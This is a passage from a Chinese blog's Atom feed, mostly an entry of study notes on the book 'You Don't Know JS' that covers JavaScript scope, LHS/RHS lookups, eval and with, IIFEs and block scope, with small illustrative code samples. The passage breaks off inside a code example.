    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本文是我在复习CSS，准备实习面试时整理的笔记，参考自一些已经整理好的博客：&lt;a href=&quot;https://github.com/Cavs</summary>
      
    
    
    
    <category term="面试准备" scheme="https://asura1211.github.io/categories/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"/>
    
    
    <category term="CSS" scheme="https://asura1211.github.io/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>【阅读笔记】— — 你不知道的JavaScript（上）</title>
    <link href="https://asura1211.github.io/2021/06/24/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JavaScript%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <id>https://asura1211.github.io/2021/06/24/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JavaScript%EF%BC%88%E4%B8%8A%EF%BC%89/</id>
    <published>2021-06-24T21:29:02.000Z</published>
    <updated>2021-10-13T05:43:19.409Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是阅读《你不知道的Javascript》（上）的笔记，大部分内容借鉴了<a href="https://juejin.cn/post/6844903725249593351#heading-6">shotCat大神的文章</a>，因为这篇已经总结的很好了，所以我就在此基础上增加自己的理解，方便今后学习复习javascript。（侵权删）</p><h1 id="第一部分-作用域和闭包"><a href="#第一部分-作用域和闭包" class="headerlink" title="第一部分 作用域和闭包"></a>第一部分 作用域和闭包</h1><h2 id="第一章-作用域是什么"><a href="#第一章-作用域是什么" class="headerlink" title="第一章 作用域是什么"></a>第一章 作用域是什么</h2><h3 id="1-1-编译原理"><a href="#1-1-编译原理" class="headerlink" title="1.1 编译原理"></a>1.1 编译原理</h3><p><strong>传统编译的三个步骤</strong></p><ul><li><strong>1，分词/词法分析 :</strong> 这个过程会将由字符组成的字符串分解成有意义的代码块，这些代码块被称为词法单元(token)。例如 var a = 2; 通常会被分解成 var、a、=、2、; 空格是否有效取决于这门语言。</li><li><strong>2，解析/语法分析:</strong> 这个过程是将词法单元流转换成一个由元素逐级嵌套所组成的代表了程序语法结构的树——“<strong>抽象语法树</strong>”(Abstract Syntax Tree，AST)。</li><li><strong>3，代码生成:</strong> 将 AST 转换为可执行代码的过程称被称为代码生成。这个过程与语言、目标平台等息息相关。抛开具体细节，简单来说就是有某种方法可以将 var a = 2; 的 AST 转化为一组机器指令，用来创建一个叫作 a 的变量(包括分配内存等)，并将一个值储存在 a 中。</li></ul><p><em><strong>说明:</strong></em> 此处只需记住第一步:分词/词法分析.第二步:解析/语法分析，得到抽象语法树(AST).第三步:代码生成，将抽象语法树转换为机器指令.</p><h3 id="1-2-理解作用域"><a href="#1-2-理解作用域" class="headerlink" title="1.2 理解作用域"></a>1.2 理解作用域</h3><h4 id="1-2-1-代码编译到执行的参与者"><a href="#1-2-1-代码编译到执行的参与者" class="headerlink" title="1.2.1 代码编译到执行的参与者"></a>1.2.1 代码编译到执行的参与者</h4><p>**var a = 2;**当我们写了var a =2;之后需要引擎，编译器，作用域的共同参与。</p><ul><li><strong>引擎</strong>。从头到尾负责整个 JavaScript 程序的编译及执行过程。</li><li><strong>编译器</strong>。负责语法分析及代码生成等脏活累活。</li><li><strong>作用域</strong>。负责收集并维护由所有声明的标识符(变量)组成的一系列查询，并实施一套非常严格的规则，确定当前执行的代码对这些标识符的访问权限。</li></ul><h4 id="1-2-2-代码编译执行过程"><a href="#1-2-2-代码编译执行过程" class="headerlink" title="1.2.2 代码编译执行过程"></a>1.2.2 代码编译执行过程</h4><p><img src="https://user-gold-cdn.xitu.io/2018/11/25/1674b0e35937a479%EF%BC%9Fw=1186&h=1292&f=png&s=105617" alt="JavaScript对var a =2;的处理过程"></p><p>（这个图太好了！）</p><h4 id="1-2-3-作用域的LHS查询和RHS查询"><a href="#1-2-3-作用域的LHS查询和RHS查询" class="headerlink" title="1.2.3 作用域的LHS查询和RHS查询"></a>1.2.3 作用域的LHS查询和RHS查询</h4><p>由上图可知，引擎在获得编译器给的代码后，还会对作用域进行询问<strong>变量</strong>。</p><p>现在将例子改为var a = b；此时引擎会对变量a和变量b都向<strong>作用域</strong>进行查询。查询分为两种：<strong>LHS</strong>（LHS 查询试图找到变量的容器本身，从而可以对其赋值。）和 <strong>RHS</strong>（RHS 查询即简单地查找某个变量的值）。其中L代表左，R代表右。即对变量a进行LHS查询.对变量b进行RHS查询.</p><h4 id="1-2-4-引擎和作用域的对话"><a href="#1-2-4-引擎和作用域的对话" class="headerlink" title="1.2.4 引擎和作用域的对话"></a>1.2.4 引擎和作用域的对话</h4><p>引擎进行LHS和RHS查询时都会找作用域要。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( a ); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line">foo( <span class="number">2</span> );</span><br></pre></td></tr></table></figure><p>让我们把上面这段代码的处理过程想象成一段对话，这段对话可能是下面这样的。</p><p>引擎:我说作用域，我需要为 foo 进行 RHS 引用。你见过它吗？<br>作用域:别说，我还真见过，编译器那小子刚刚声明了它。它是一个函数，给你。<br>引擎:哥们太够意思了！好吧，我来执行一下 foo。<br>引擎:作用域，还有个事儿。我需要为 a 进行 LHS 引用，这个你见过吗？<br>作用域:这个也见过，编译器最近把它声名为 foo 的一个形式参数了，拿去吧。<br>引擎:大恩不言谢，你总是这么棒。现在我要把 2 赋值给 a。<br>引擎:哥们，不好意思又来打扰你。我要为 console 进行 RHS 引用，你见过它吗？<br>作用域:咱俩谁跟谁啊，再说我就是干这个。这个我也有，console 是个内置对象。 给你。<br>引擎:么么哒。我得看看这里面是不是有 log(..)。太好了，找到了，是一个函数。<br>引擎:哥们，能帮我再找一下对 a 的 RHS 引用吗？虽然我记得它，但想再确认一次。<br>作用域:放心吧，这个变量没有变动过，拿走，不谢。<br>引擎:真棒。我来把 a 的值，也就是 2，传递进 log(..)。</p><h3 id="1-3作用域嵌套"><a href="#1-3作用域嵌套" class="headerlink" title="1.3作用域嵌套"></a>1.3作用域嵌套</h3><p>当一个块或函数嵌套在另一个块或函数中时，就发生了作用域的嵌套，进而形成了一条作用域链。因此，在当前作用域中无法找到某个变量时，引擎就会在外层嵌套的作用域中继续查找，直到找到该变量， 或抵达最外层的作用域(也就是全局作用域)为止。</p><h3 id="1-4-异常"><a href="#1-4-异常" class="headerlink" title="1.4 异常"></a>1.4 异常</h3><p>例子:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( a + b ); </span><br><span class="line">  b = a;</span><br><span class="line">&#125;</span><br><span class="line">foo( <span class="number">2</span> );</span><br></pre></td></tr></table></figure><ul><li>如果 RHS 查询在所有嵌套的作用域中遍寻不到所需的变量，引擎就会抛出 <strong>ReferenceError</strong> 异常。例如上面例子中<code>console.log(a+b)</code>：由于RHS此时找不到b（一个“未声明”的变 量），故会抛出ReferenceError。</li><li>如果 RHS 查询找到了一个变量，但是你尝试对这个变量的值进行不合理的操作， 比如试图对一个非函数类型的值进行函数调用，或着引用 null 或 undefined 类型的值中的属性，那么引擎会抛出另外一种类型的异常，叫作 <strong>TypeError</strong>。</li><li>当引擎执行 LHS 查询时，<strong>如果在顶层(全局作用域)中也无法找到目标变量，全局作用域中就会创建一个具有该名称的变量</strong>，并将其返还给引擎，前提是程序运行<strong>在非 “严格模式”下</strong>。例如上面例子中的<code>b=a</code></li><li>在严格模式中 LHS 查询失败时，并不会创建并返回一个全局变量，引擎会抛出同 RHS 查询失败时类似的 ReferenceError 异常。</li></ul><p>ReferenceError 同作用域判别失败相关，而 TypeError 则代表作用域判别成功了，但是对结果的操作是非法或不合理的。</p><h3 id="1-5-LHS与RHS小结"><a href="#1-5-LHS与RHS小结" class="headerlink" title="1.5 LHS与RHS小结"></a>1.5 LHS与RHS小结</h3><ul><li>LHS和RHS查询都是引擎对作用域的查询，且只对变量进行查询</li><li>LHS和RHS都会沿着作用域链进行查询，直到最上层的全局作用域.如果没找到的话，在非严格模式下，LHS则会在全局创建一个相同名称的变量；RHS则会抛出ReferenceError的异常.</li><li>如果查找的目的是对变量进行赋值，那么就会使用 LHS 查询;如果目的是获取变量的值，就会使用 RHS 查询。</li><li>LHS只是找到变量的容器而已，方便进行赋值，RHS查询则需要找到变量的值。</li><li><code>=</code>操作符或调用函数时传入参数的操作都会导致关联作用域的赋值操作。此时都会进行LHS查询。</li></ul><h2 id="第二章-词法作用域"><a href="#第二章-词法作用域" class="headerlink" title="第二章 词法作用域"></a>第二章 词法作用域</h2><p>作用域分为两种工作模式:</p><ul><li>1，<strong>词法作用域</strong>.是目前最为普遍的，被大多数编程语言所采用的模式.当然JavaScript也是使用的词法作用域.</li><li>2，<strong>动态作用域</strong>.使用较少，比如 Bash 脚本、Perl 中的一些模式等.</li></ul><h3 id="2-1-词法阶段"><a href="#2-1-词法阶段" class="headerlink" title="2.1 词法阶段"></a>2.1 词法阶段</h3><p><strong>词法阶段:</strong> 大部分标准语言编译器的第一个工作阶段叫作词法化(也叫单词化)。词法化的过程会对源代码中的字符进行检查，如果是有状态的解析过程，还会赋予单词语义。</p><p><strong>词法作用域:</strong> 词法作用域就是定义在词法阶段的作用域，也被称为静态作用域。即在JavaScript里作用域的产生是在编译器出来的第一阶段词法阶段产生的，并且是你在书写完代码时就已经确定了的.</p><p><strong>词法作用域位置:</strong> 词法作用域位置范围完全由写代码期间函数所声明的位置来决定.</p><p><strong>理解词法作用域及嵌套:</strong><br>看下例子:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123; </span><br><span class="line">  <span class="keyword">var</span> b = a * <span class="number">2</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params">c</span>) </span>&#123; </span><br><span class="line">    <span class="built_in">console</span>.log( a， b， c );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  bar( b * <span class="number">3</span> ); </span><br><span class="line">&#125;</span><br><span class="line">foo( <span class="number">2</span> ); <span class="comment">// 2， 4， 12</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这个例子中有三个逐级嵌套的作用域。为了帮助理解，可以将它们分成3个逐级包含的”气泡作用域”。</p><p><img src="https://user-gold-cdn.xitu.io/2018/11/25/1674b17a466f8fb0%EF%BC%9Fw=2020&h=814&f=png&s=173375"></p><ul><li>1:包含着整个全局作用域，其中只有一个标识符:foo。</li><li>2:包含着 foo 所创建的作用域，其中有三个标识符:a、bar 和 b。</li><li>3:包含着 bar 所创建的作用域，其中只有一个标识符:c。</li></ul><p><strong>注意:</strong> 没有任何函数的气泡可以(部分地)同时出现在两个外部作用域的气泡中，就如同没有任何函数可以部分地同时出现在两个父级函数中一样。</p><p><strong>引擎对作用域的查找:</strong><br>这一部分在上一节中已经说过，就是从当前作用域逐级向上，直到最上层的全局作用域。这里再进一步进行讲解：<strong>作用域查找会在找到第一个匹配的标识符时停止</strong>。在多层的嵌套作用域中可以定义同名的标识符，这叫作“遮蔽效应”(内部的标识符“遮蔽”了外部的标识符)。抛开遮蔽效应， 作用域查找始终从运行时所处的最内部作用域开始，逐级向外或者说向上进行，直到遇见第一个匹配的标识符为止。</p><p><strong>注意:</strong></p><ul><li>全局变量会自动成为全局对象(比如浏览器中的 window对象)的属性，因此可以不直接通过全局对象的词法名称，而是间接地通过对全局对象属性的引 用来对其进行访问。例如:<code>window.a</code>  。通过这种技术可以访问那些被同名变量所遮蔽的全局变量。但非全局的变量如果被遮蔽了，无论如何都无法被访问到。</li><li>词法作用域查找只会查找一级标识符，比如 a、b 和 c。<strong>如果代码中引用了 foo.bar.baz，词法作用域查找只会试图查找 foo 标识符</strong>，找到这个变量后，对象属性访问规则会分别接管对 bar 和 baz 属性的访问。</li></ul><h3 id="2-2-欺骗词法"><a href="#2-2-欺骗词法" class="headerlink" title="2.2 欺骗词法"></a>2.2 欺骗词法</h3><p><strong>欺骗词法:</strong> 引擎在运行时来“修改”(也可以说欺骗)词法作用域。<strong>欺骗词法的两种机制:</strong></p><h4 id="2-2-1-eval"><a href="#2-2-1-eval" class="headerlink" title="2.2.1 eval"></a>2.2.1 eval</h4><p>JavaScript 中的 eval(..) 函数可以接受一个字符串为参数，并将其中的内容视为好像在书写时就存在于程序中这个位置的代码。即将eval放在该词法作用域，然后eval携带的代码就会动态加入到该词法作用域。</p><p>通过下面的例子加深理解:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">str， a</span>) </span>&#123; </span><br><span class="line">  <span class="built_in">eval</span>( str ); <span class="comment">// 欺骗! </span></span><br><span class="line">  <span class="built_in">console</span>.log( a， b );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">2</span>;</span><br><span class="line">foo( <span class="string">&quot;var b = 3;&quot;</span>， <span class="number">1</span> ); <span class="comment">// 1， 3</span></span><br></pre></td></tr></table></figure><p>eval(..) 调用中的 “var b = 3;” 这段代码会被当作本来就在那里一样来处理。由于那段代码声明了一个新的变量 b，因此它对已经存在的 foo(..) 的词法作用域进行了修改。当 console.log(..) 被执行时，会在 foo(..) 的内部同时找到 a 和 b，但是永远也无法找到外部的 b。因此会输出“1， 3”而不是正常情况下会输出的“1， 2”。</p><p><strong>注意:</strong> </p><ul><li>eval(..) 通常被用来执行动态创建的代码，可以据程序逻辑动态地将变量和函数以字符形式拼接在一起之后传递进去。</li><li>在严格模式下，eval(..) 在运行时有其自己的词法作用域，意味着其 中的声明无法修改所在的作用域。</li><li>与eval(…)类似，setTimeout(..)和 setInterval(..) 的第一个参数可以是字符串，字符串的内容可以被解释为一段动态生成的函数代码。（不提倡）</li><li>new Function(..) 函数的行为也很类似，最后一个参数可以接受代码字符串，并将其转化为动态生成的函数(前面的参数是这个新生成的函数的形参)。这种构建函数的语法比 eval(..) 略微安全一些，但也要尽量避免使用。</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sum = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">&quot;a&quot;</span>， <span class="string">&quot;b&quot;</span>， <span class="string">&quot;return a + b;&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(sum(<span class="number">1</span>， <span class="number">1111</span>));  <span class="comment">//1112</span></span><br></pre></td></tr></table></figure><h4 id="2-2-2-with-不推荐实际使用"><a href="#2-2-2-with-不推荐实际使用" class="headerlink" title="2.2.2 with(不推荐实际使用)"></a>2.2.2 with(不推荐实际使用)</h4><p>例子:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">obj</span>) </span>&#123; </span><br><span class="line">  <span class="keyword">with</span> (obj) &#123;</span><br><span class="line">    a = <span class="number">2</span>; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o1 = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o2 = &#123; </span><br><span class="line">  <span class="attr">b</span>: <span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line">foo( o1 );</span><br><span class="line"><span class="built_in">console</span>.log( o1.a ); <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">foo( o2 );</span><br><span class="line"><span class="built_in">console</span>.log( o2.a ); <span class="comment">// undefined</span></span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// 2——不好，a 被泄漏到全局作用域上了!</span></span><br></pre></td></tr></table></figure><p>当我们将 o1 传递进去，a＝2 赋值操作找到了 o1.a 并将 2 赋值给它，这在后面的 console. log(o1.a) 中可以体现。而当 o2 传递进去，o2 并没有 a 属性，因此不会创建这个属性， o2.a 保持 undefined。但是，为什么最后console.log(a)会为2？因为在执行foo(o2)时，with会对其中的a=2进行LHS查询，但它在o2作用域，foo()作用域，全局作用域都没找到，因此就创建了一个全局变量a并随后赋值2。</p><p>总的来说，with就是将一个没有或有多个属性的对象处理为一个完全隔离的词法作用域，因此这个对象的属性也会被处理为定义在这个作用域中的词法标识符。</p><p><strong>注意:</strong> 使用 eval(..) 和 with 的原因是会被严格模式所影响(限制)。with 被完全禁止，而在保留核心功能的前提下，间接或非安全地使用 eval(..) 也被禁止了。</p><h4 id="2-2-3-性能"><a href="#2-2-3-性能" class="headerlink" title="2.2.3 性能"></a>2.2.3 性能</h4><p>JavaScript 引擎会在编译阶段进行数项的性能优化。其中有些优化依赖于能够根据代码的词法进行<strong>静态分析</strong>，并<strong>预先确定</strong>所有变量和函数的定义位置，才能在执行过程中快速找到标识符。但是eval(..) 和 with会在运行时修改或创建新的作用域，以此来欺骗其他在书写时定义的词法作用域。这么做就会导致引擎无法知道eval和with它们对词法作用域进行什么样的改动.只能对部分不进行处理和优化。因此如果代码中大量使用 eval(..) 或 with，那么运行起来一定会变得非常慢。</p><h3 id="2-3-小结"><a href="#2-3-小结" class="headerlink" title="2.3 小结"></a>2.3 小结</h3><ul><li>词法作用域是在你书写代码时就已经决定了的。在编译的第一阶段词法分析阶段产生词法作用域，此时词法作用域基本能够知道全部标识符在哪里以及是如何声明的，从而能够预测在执行过程中如何对它们进行查找。</li><li>eval(..) 和 with。前者可以对一段包含一个或多个声明的“代码”字符串进行演算，并借此来修改已经存在的词法作用域(在运行时)。后者本质上是通过将一个对象的引用当作作用域来处理，将对象的属性当作作用域中的标识符来处理，从而创建了一个新的词法作用域(同样是在运行时)。</li><li>一般不要在实际代码中使用eval(…)和with，因为不仅危险，而且会造成性能问题!</li></ul><h2 id="第三章-函数作用域和块作用域"><a href="#第三章-函数作用域和块作用域" class="headerlink" title="第三章 函数作用域和块作用域"></a>第三章 函数作用域和块作用域</h2><h3 id="3-1-函数中的作用域"><a href="#3-1-函数中的作用域" class="headerlink" title="3.1 函数中的作用域"></a>3.1 函数中的作用域</h3><ul><li>JavaScript 具有基于函数的作用域，一般情况下每声明一个函数都会创建一个函数作用域.</li><li>函数作用域的含义是指，属于这个函数的全部变量都可以在整个函数的范围内使用及复用(事实上在嵌套的作用域中也可以使用)。这样的好处是JavaScript 变量可以根据需要改变值类型。</li></ul><h3 id="3-2-隐藏内部实现"><a href="#3-2-隐藏内部实现" class="headerlink" title="3.2 隐藏内部实现"></a>3.2 隐藏内部实现</h3><p>因为</p><ul><li>子级函数作用域可以直接访问父级函数作用域里的标识符;</li><li>父级函数作用域不能直接访问子级函数作用域里的标识符.</li></ul><p>所以用函数声明对代码进行包装，实际上就是把这些代码“隐藏”起来了。</p><p><strong>为什么要将代码进行”隐藏”？</strong>    </p><p>因为最小授权或最小暴露原则。这个原则是指在软件设计中，应该最小限度地暴露必 要内容，而将其他内容都“隐藏”起来，比如某个模块或对象的 API 设计。    </p><p><strong>隐藏的好处:</strong></p><ul><li>实现代码私有化，减少外部对内部代码的干扰，保持其稳定性.</li><li><strong>规避冲突:</strong> 可以避免同名标识符之间的冲突， 两个标识符可能具有相同的名字但用途却不一样，无意间可能造成命名冲突。冲突会导致变量的值被意外覆盖。那么一般规避冲突的手段有哪些？<ol><li><strong>全局命名空间:</strong> 变量冲突的一个典型例子存在于全局作用域中。当程序中加载了多个第三方库时，如果它们没有妥善地将内部私有的函数或变量隐藏起来，就会很容易引发冲突。这些库通常会在全局作用域中声明一个名字足够独特的变量，通常是一个对象。这个对象被用作库的命名空间，所有需要暴露给外界的功能都会成为这个对象(命名空间)的属性，而不是将自己的标识符暴漏在顶级的词法作用域中。 </li><li><strong>模块管理:</strong> 另外一种避免冲突的办法和现代的模块机制很接近，就是从众多模块管理器中挑选一个来 使用。实际上就是我们常用的amd，commonjs，import模块机制.</li></ol></li></ul><h3 id="3-3-函数作用域"><a href="#3-3-函数作用域" class="headerlink" title="3.3 函数作用域"></a>3.3 函数作用域</h3><p><strong>函数声明与函数表达式:</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们知道函数foo内的变量和函数被隐藏起来了，是不会对全局作用域造成污染。但是变量名foo仍然存在于全局作用域中，会造成污染。那有什么方法能避免函数名的污染呢？那就是<strong>作为函数表达式</strong>，而不是一个标准的函数声明。这样函数名只存在于它自己的函数作用域内，而不会存在于其父作用域，这样就没有了污染。举个函数声明的例子:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">3</span>;</span><br><span class="line">  <span class="built_in">console</span>.log( a ); <span class="comment">// 3 </span></span><br><span class="line">&#125;)(); </span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>当我们用()包裹一个函数，并立即执行。此时这个包装函数声明是从<code>(function...</code>开始的而不是从function…开始。这样foo就会被当做一个函数表达式，而不是一个函数声明(即foo不会存在于父级作用域中)。回到上面的例子中，全局作用域是访问不到foo的，foo只存在于它自己的函数作用域中。</p><p><strong>补充: 什么是函数声明和函数表达式</strong>首先我们得了解JS声明函数的三种方式:</p><ul><li><strong>函数表达式:</strong> 将函数定义为表达式语句的一部分。通过函数表达式定义的函数可以是命名的，也可以是匿名的。因为它可以没有函数名，因此常被用作匿名函数。如果有，其函数名也只存在自身的函数作用域，并且函数表达式不能以“function”开头。函数表达式可以存储在变量或者对象属性里 (在函数声明前加上运算符是可以将其转化为函数表达式的。例如<code>!</code>，<code>+</code>，<code>-</code>，<code>()</code>.举个例子:<code>!function()&#123;console.log(1)&#125;()</code>的结果是1，并不会报错)</li><li><strong>函数声明:</strong>  函数声明是一种独立的结构，它会声明一个具名函数，并必须以function开头。且函数声明会进行函数提升，使它能在其所在作用域的任意位置被调用，即后面的代码中可以将此函数通过函数名赋值给变量或者对象属性。</li><li><strong>Function()构造器:</strong> 即使用Function构造器创建函数。不推荐这种用法， 容易出问题</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Function()构造器</span></span><br><span class="line"><span class="keyword">var</span> f =<span class="keyword">new</span> <span class="built_in">Function</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数表达式</span></span><br><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="number">1</span>);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f())</span><br><span class="line"><span class="comment">//1  undefined</span></span><br></pre></td></tr></table></figure><p><strong>怎么区分函数声明和函数表达式:</strong><br>看 function 关键字出现在声明中的位置(不仅仅是一行代码，而是整个声明中的位置)。如果 function 是声明中的第一个词，那么就是一个函数声明，否则就是一个函数表达式。<strong>补充（内在区别）：</strong> </p><ul><li>函数提升:函数声明，会将整个函数进行提升；而函数表达式则不会提升，它是在引擎运行时进行赋值，且要等到表达式赋值完成后才能调用。 </li><li>函数表达式是可以没有函数名的，如果有，它的函数名也只存在于自身的作用域，<code>var f = function fun()&#123;console.log(fun)&#125;</code>其他地方是没有的。这也避免了全局污染，也方便递归。</li></ul><h4 id="3-3-1-匿名和具名"><a href="#3-3-1-匿名和具名" class="headerlink" title="3.3.1 匿名和具名"></a>3.3.1 匿名和具名</h4><p>函数表达式可以是匿名的，而函数声明则不可以省略函数名。匿名函数的缺点:</p><ul><li>匿名函数在栈追踪中不会显示出有意义的函数名，使得调试很困难。</li><li>如果没有函数名，当函数需要引用自身时只能使用已经过期的arguments.callee引用，比如在递归中。另一个函数需要引用自身的例子，是在事件触发后事件监听器需要解绑自身。</li><li>匿名函数省略了对于代码可读性/可理解性很重要的函数名。一个描述性的名称可以让代码不言自明。</li></ul><h4 id="3-3-2-立即执行函数表达式"><a href="#3-3-2-立即执行函数表达式" class="headerlink" title="3.3.2 立即执行函数表达式"></a>3.3.2 立即执行函数表达式</h4><p>比如 (function foo(){ .. })()。第一个 ( ) 将函数变成表达式，第二个 ( ) 执行了这个函数。这就是立即执行函数表达式，也被称为IIFE，代表<strong>立即执行函数表达式</strong> (Immediately Invoked Function Expression);</p><p>IIFE可以具名也可以匿名，好处和上面提到的一样。IIFE还可以是这种形式<code>(function()&#123; .. &#125;())</code>.这两种形式在功能上是一致的。</p><h3 id="3-4-块作用域"><a href="#3-4-块作用域" class="headerlink" title="3.4 块作用域"></a>3.4 块作用域</h3><p>函数作用域是JavaScript最常见的作用域单元，有时我们仅会将var赋值变量在if或for的{…}内使用，而不会在其他地方使用。但它仍然会对外层的函数作用域造成污染，这个时候就会希望能有一个作用域能将其外部的函数作用域隔开，声明的变量仅在此作用域有效。块作用域(通常就是{…}包裹的内部)就可以帮我们做到这点。</p><h4 id="3-4-1-with"><a href="#3-4-1-with" class="headerlink" title="3.4.1 with"></a>3.4.1 with</h4><p> with 不仅是一个难于理解的结构，同时也是块作用域的一个例子(块作用域的一种形式)，用 with 从对象中创建出的作用域仅在 with 声明中而非外部作用域中有效。</p><h4 id="3-4-2-try-catch"><a href="#3-4-2-try-catch" class="headerlink" title="3.4.2 try/catch"></a>3.4.2 try/catch</h4><p>try/catch 的 catch 分句会创建一个块作用域，其中声明的变量仅在 catch 内部有效。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="literal">undefined</span>(); <span class="comment">// 执行一个非法操作来强制制造一个异常</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (err) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log( err ); <span class="comment">// 能够正常执行! </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log( err ); <span class="comment">// ReferenceError: err not found</span></span><br></pre></td></tr></table></figure><p>err 仅存在 catch 分句内部，当试图从别处引用它时会抛出错误。<br>那么如果我们想用catch创建一个不是仅仅接收err的块作用域，该怎么做呢？</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;<span class="keyword">throw</span> <span class="number">2</span>;&#125;<span class="keyword">catch</span>(a)&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( a ); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// ReferenceError</span></span><br></pre></td></tr></table></figure><p>这样就创建了一个块作用域，且a=2，仅在catch分句中存在。在ES6之前我们可以使用这种方法来使用块作用域。</p><h4 id="3-4-3-let"><a href="#3-4-3-let" class="headerlink" title="3.4.3 let"></a>3.4.3 let</h4><p>ES6 引入了新的 let 关键字，提供了除 var 以外的另一种变量声明方式。let 关键字可以将变量绑定到所在的任意作用域中(通常是 { .. } 内部)。</p><p>用 let 将变量附加在一个已经存在的块作用域上的行为是隐式的，例如在if的{…}内用let声明一个变量。那什么是<strong>显式地创建块作用域</strong>呢？就是单独创建<code>&#123;&#125;</code>来作为let的块作用域.而不是借用if或者for提供的<code>&#123;&#125;</code>。例如:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="keyword">let</span> a=<span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 使用 let 进行的声明不会在块作用域中进行提升。 </p><p><strong>块作用域的好处:</strong></p><ul><li>垃圾收集</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 在这里做点有趣的事情</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> someReallyBigData=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//dosomeing</span></span><br><span class="line">&#125;</span><br><span class="line">process(someReallyBigData);</span><br><span class="line"><span class="keyword">var</span> btn=<span class="built_in">document</span>.getElementById(<span class="string">&quot;my_button&quot;</span>);</span><br><span class="line">btn.addEventListener(<span class="string">&quot;click&quot;</span>，<span class="function"><span class="keyword">function</span> <span class="title">click</span>(<span class="params">evt</span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">&quot;button click&quot;</span>);</span><br><span class="line">    <span 